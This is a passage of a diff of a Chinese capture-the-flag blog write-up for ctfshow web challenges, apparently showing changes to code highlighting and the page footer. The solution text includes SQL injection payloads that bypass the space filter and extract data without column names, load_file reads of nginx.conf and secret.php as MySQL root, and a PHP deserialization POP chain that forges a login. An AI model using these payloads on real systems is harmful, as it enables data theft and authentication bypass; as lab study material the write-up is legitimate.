<span class="comment">------1,1,2,3</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(`<span class="number">2</span>`)<span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>content)<span class="keyword">as</span><span class="comment">/**/</span>a) <span class="comment">------2,admin,gtf1y,Wow</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(`<span class="number">3</span>`)<span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>content)<span class="keyword">as</span><span class="comment">/**/</span>a)<span class="comment">---3,flag is not here!,wow,you can really dance,tell you a secret,secret has a secret...</span></span><br></pre></td></tr></table></figure>
 
 <p>Flag 不在数据库中，可能还得mysql读取敏感文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先看一下数据库用户名是什么</span><br><span class="line">-1/**/union/**/select/**/user()------root@localhost</span><br><span class="line">意味着我们可以用root用户高权限使用MySQL进行命令执行</span><br><span class="line">-1/**/union/**/select/**/load_file(&quot;/etc/nginx/nginx.conf&quot;)------通过root /var/www/html;：知道了网页根目录</span><br><span class="line">-1/**/union/**/select/**/load_file(&quot;/var/www/html/secret.php&quot;)----结合一开始题目的include代码，试着读取目录下的secret.php文件</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先看一下数据库用户名是什么</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">user</span>()<span class="comment">------root@localhost</span></span><br><span class="line">意味着我们可以用root用户高权限使用MySQL进行命令执行</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>load_file(&quot;/etc/nginx/nginx.conf&quot;)<span class="comment">------通过root /var/www/html;：知道了网页根目录</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>load_file(&quot;/var/www/html/secret.php&quot;)<span class="comment">----结合一开始题目的include代码，试着读取目录下的secret.php文件</span></span><br></pre></td></tr></table></figure>
 
 <p>读取后返回一段代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- ReadMe --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;here_1s_your_f1ag.php&#x27;;</span><br><span class="line">$file = &#x27;/tmp/gtf1y&#x27;;</span><br><span class="line">if(trim(@file_get_contents($file)) === &#x27;ctf.show&#x27;)&#123;</span><br><span class="line">	echo file_get_contents(&#x27;/real_flag_is_here&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="comment">&lt;!-- ReadMe --&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="variable">$url</span> = <span class="string">&#x27;here_1s_your_f1ag.php&#x27;</span>;</span></span><br><span class="line"><span class="language-php"><span class="variable">$file</span> = <span class="string">&#x27;/tmp/gtf1y&#x27;</span>;</span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span>(<span class="title function_ invoke__">trim</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>)) === <span class="string">&#x27;ctf.show&#x27;</span>)&#123;</span></span><br><span class="line"><span class="language-php">	<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/real_flag_is_here&#x27;</span>);</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br></pre></td></tr></table></figure>
 
 <p>直接读取目录下的real_flag_is_here</p>
 <h2 id="红包题第六弹"><a href="#红包题第六弹" class="headerlink" title="红包题第六弹"></a>红包题第六弹</h2><h3 id="强碰撞-文件竞争"><a href="#强碰撞-文件竞争" class="headerlink" title="#强碰撞+文件竞争"></a>#强碰撞+文件竞争</h3><p>1.不是SQL注入 2.需要找关键源码</p>
@@ -537,7 +681,7 @@
 <p>这里的话有条件就是需要让两个文件的md5值相等但是sha512值不相等</p>
 <p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310200920613.png" alt="image-20250310200920613"></p>
 <p>在源码中看到一行代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oReq.open(&quot;POST&quot;, &quot;check.php?token=&quot;+token+&quot;&amp;php://input&quot;, true);</span><br></pre></td></tr></table></figure>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oReq.open(<span class="string">&quot;<span class="keyword">POST</span>&quot;</span>, <span class="string">&quot;check.php?token=&quot;</span>+token+<span class="string">&quot;&amp;php://input&quot;</span>, true);</span><br></pre></td></tr></table></figure>
 
 <p> 对当前日期做了一个MD5的编码,可以发现是需要用php:&#x2F;&#x2F;input获取文件流，然后返回一个文件</p>
 <p>需要自己传上去的文件与已存在的key.dat MD5要一致，sha512不一致，但是首先的就是我们需要获取到这个key.dat，后来发现直接访问就下载下来了</p>
@@ -611,7 +755,7 @@
 
 <p>这里的话有两种条件可以返回用户id，第一个是让token等于admin，第二个是让password的md5加密值符合数据库查询结果中的password。但是只有在password的判断语句不满足之后才会对token进行一个赋值操作，再返回用户id，所以实际上也是只能看第二个方法。</p>
 <p>我们重点关注那个查询语句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,password from user where username=?</span><br></pre></td></tr></table></figure>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=?</span><br></pre></td></tr></table></figure>
 
 <p>通过where语句对传入的username去查询相应的id和password。</p>
 <p>然后我们再来看update文件中的内容，可以看到要session[login]&#x3D;1 ,才能获得flag</p>
@@ -627,11 +771,11 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$age</span>,<span class="variable">$nickname</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname=<span class="variable">$nickname</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$argument</span></span>)</span>&#123;<span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;CtrlCase-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$argument</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>在call里面我们可以看到这里就可以触发我们的login方法，同时传入的参数$sql也是我们可控的，那么假如我们传入一个自定义的id和password，再集合我们自己post传入的password，就可以达到一个绕过的目的，例如我们的查询语句设置为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27; from user where username=?</span><br></pre></td></tr></table></figure>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=?</span><br></pre></td></tr></table></figure>
 
 <p>这里的话sql查询后返回的就是1的MD5值，也就是c4ca4238a0b923820dcc509a6f75849b，这时候我们让我们的post的password为1，就可以满足条件了</p>
 <p>有思路之后我们就开始写pop链</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UpdateHelper:__destruct()-&gt;User:__toString()-&gt;Info:__call()-&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UpdateHelper:__destruct<span class="function"><span class="params">()</span>-&gt;</span>User:__toString<span class="function"><span class="params">()</span>-&gt;</span>Info:__call<span class="function"><span class="params">()</span>-&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>这里的话为了触发call方法，需要调用一个不存在的方法，在<code>__toString</code>方法中存在一个调用方法的步骤</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;nickname-&gt;<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;age);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -674,164 +818,117 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">string_to_unicode_escape</span>(text):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;将字符串转换为 `\uXXXX` 格式的字符串&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> text.<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;unicode_escape&#x27;</span>).<span class="title function_ invoke__">decode</span>(<span class="string">&#x27;ascii&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
 
-  </div>
-</article>
-
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">H0me</a></li>
-        
-          <li><a href="/about/">A6out</a></li>
-        
-          <li><a href="/tags/">T6gs</a></li>
-        
-          <li><a href="/categories/">Catagory</a></li>
-        
-          <li><a href="/links/">L1nks</a></li>
-        
-          <li><a href="/search/">s4arch</a></li>
-        
-      </ul>
     </div>
 
     
     
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02web%E9%A2%98%E7%9B%AE"><span class="toc-number">2.</span> <span class="toc-text">0x02web题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">2.1.</span> <span class="toc-text">web签到题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">2.1.1.</span> <span class="toc-text">#源码泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2"><span class="toc-number">2.2.</span> <span class="toc-text">web2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.1.</span> <span class="toc-text">#mysql联合注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web3"><span class="toc-number">2.3.</span> <span class="toc-text">web3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.3.1.</span> <span class="toc-text">#include文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web4"><span class="toc-number">2.4.</span> <span class="toc-text">web4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5"><span class="toc-number">2.4.1.</span> <span class="toc-text">#日志注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web5"><span class="toc-number">2.5.</span> <span class="toc-text">web5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E6%AF%94%E8%BE%83MD5"><span class="toc-number">2.5.1.</span> <span class="toc-text">#弱比较MD5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctype-alpha-v1"><span class="toc-number">2.5.2.</span> <span class="toc-text">ctype_alpha($v1)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#is-numeric-v2"><span class="toc-number">2.5.3.</span> <span class="toc-text">is_numeric($v2)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%A4%B4%E4%B8%BA0E%EF%BC%88MD5%E5%80%BC%E7%A2%B0%E6%92%9E%EF%BC%89"><span class="toc-number">2.5.4.</span> <span class="toc-text">开头为0E（MD5值碰撞）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web6"><span class="toc-number">2.6.</span> <span class="toc-text">web6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%9A%84%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">2.6.1.</span> <span class="toc-text">#过滤空格的联合注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web7"><span class="toc-number">2.7.</span> <span class="toc-text">web7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B-%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">2.7.1.</span> <span class="toc-text">#数字型+引号过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web8"><span class="toc-number">2.8.</span> <span class="toc-text">web8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7"><span class="toc-number">2.8.1.</span> <span class="toc-text">#布尔盲注+过滤逗号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%80%97%E5%8F%B7"><span class="toc-number">2.8.2.</span> <span class="toc-text">绕过逗号</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#from-for"><span class="toc-number">2.8.2.1.</span> <span class="toc-text">from for</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">2.8.3.</span> <span class="toc-text">布尔盲注脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web9"><span class="toc-number">2.9.</span> <span class="toc-text">web9</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MD5%E7%9A%84sql"><span class="toc-number">2.9.1.</span> <span class="toc-text">#MD5的sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MD5-SQL%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.9.2.</span> <span class="toc-text">MD5 SQL绕过漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#md5-string-raw-%E5%87%BD%E6%95%B0"><span class="toc-number">2.9.2.1.</span> <span class="toc-text">md5(string,raw)函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web10"><span class="toc-number">2.10.</span> <span class="toc-text">web10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E8%A1%A8%E6%9E%84%E9%80%A0%E7%BB%95%E8%BF%87"><span class="toc-number">2.10.1.</span> <span class="toc-text">#虚拟表构造绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysqli-query-%E5%87%BD%E6%95%B0"><span class="toc-number">2.10.2.</span> <span class="toc-text">mysqli_query()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysqli-num-rows-%E5%87%BD%E6%95%B0"><span class="toc-number">2.10.3.</span> <span class="toc-text">mysqli_num_rows()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s%E7%AC%A6%E5%8F%B7"><span class="toc-number">2.10.4.</span> <span class="toc-text">\s符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E8%99%9A%E6%8B%9F%E8%A1%A8with-rollup%E7%BB%95%E8%BF%87"><span class="toc-number">2.10.5.</span> <span class="toc-text">构建虚拟表with rollup绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web11"><span class="toc-number">2.11.</span> <span class="toc-text">web11</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E4%BC%AA%E9%80%A0"><span class="toc-number">2.11.1.</span> <span class="toc-text">#session伪造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web12"><span class="toc-number">2.12.</span> <span class="toc-text">web12</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87disable-function"><span class="toc-number">2.12.1.</span> <span class="toc-text">#绕过disable_function</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%BC%B9"><span class="toc-number">2.13.</span> <span class="toc-text">红包题第二弹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE"><span class="toc-number">2.13.1.</span> <span class="toc-text">#无数字字母RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web13"><span class="toc-number">2.14.</span> <span class="toc-text">web13</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#user-ini%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.14.1.</span> <span class="toc-text">#.user.ini文件上传</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web14"><span class="toc-number">2.15.</span> <span class="toc-text">web14</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-mysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">2.15.1.</span> <span class="toc-text">#无列名注入+mysql读取文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E5%85%AD%E5%BC%B9"><span class="toc-number">2.16.</span> <span class="toc-text">红包题第六弹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%A2%B0%E6%92%9E-%E6%96%87%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">2.16.1.</span> <span class="toc-text">#强碰撞+文件竞争</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E4%B8%83%E5%BC%B9"><span class="toc-number">2.17.</span> <span class="toc-text">红包题第七弹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#git%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-%E7%BB%95%E8%BF%87disable-function"><span class="toc-number">2.17.1.</span> <span class="toc-text">#.git文件泄露+绕过disable_function</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%90%8C%E6%96%B0%E4%B8%93%E5%B1%9E%E7%BA%A2%E5%8C%85%E9%A2%98"><span class="toc-number">2.18.</span> <span class="toc-text">萌新专属红包题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4"><span class="toc-number">2.18.1.</span> <span class="toc-text">#弱口令爆破</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFshow-web1"><span class="toc-number">2.19.</span> <span class="toc-text">CTFshow web1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.19.1.</span> <span class="toc-text">#布尔盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#game-gyctf-web2"><span class="toc-number">2.20.</span> <span class="toc-text">game-gyctf web2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">2.20.1.</span> <span class="toc-text">#反序列化字符串逃逸</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web15-Fishman"><span class="toc-number">2.21.</span> <span class="toc-text">web15 Fishman</span></a></li></ol></li></ol>
-      </div>
     
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/&text=ctfshow之web专题"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/&title=ctfshow之web专题"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/&is_video=false&description=ctfshow之web专题"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=ctfshow之web专题&body=Check out this article: https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/&title=ctfshow之web专题"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/&title=ctfshow之web专题"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/&title=ctfshow之web专题"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/&title=ctfshow之web专题"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/&name=ctfshow之web专题&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/&t=ctfshow之web专题"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+	
+	<div>
+	  
+		
+<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
 </div>
 
+	  
+	</div>
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>wanTh3flag
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/" title="ctfshow之web专题">https://wanth3f1ag.top/2025/03/10/ctfshow之web专题/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
         
-        
-<footer id="footer">
-    <div class="footer-left">
-        Copyright ©
-        
-        
-        2024-2025
-        wanTh3flag
-        <br>
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/03/05/ctfshow%E6%91%86%E7%83%82%E6%9D%AF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/" rel="prev" title="ctfshow摆烂杯(已做完)">
+                  <i class="fa fa-angle-left"></i> ctfshow摆烂杯(已做完)
+                </a>
+            </div>
+            <div class="post-nav-item">
